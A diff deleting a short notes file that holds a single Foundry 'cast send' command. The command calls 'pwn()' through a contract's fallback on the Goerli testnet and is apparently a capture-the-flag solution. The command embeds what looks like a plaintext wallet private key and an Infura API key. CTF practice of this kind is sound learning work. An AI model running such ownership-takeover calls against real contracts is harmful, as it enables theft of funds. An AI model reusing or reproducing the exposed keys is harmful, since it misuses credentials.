@@ -1,8 +1,0 @@
-1. Send tx to call fallback()
-
-cast send 0x3A127bbaD4774157A841e27302B9ed16246b3E7d \
-"pwn()" 0x2Cd71C554354781333019FcD78Ddccc9CEFC7F63 \
---rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \
---private-key=0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \
---gas-limit 500000 \
---gas-price 5gwei
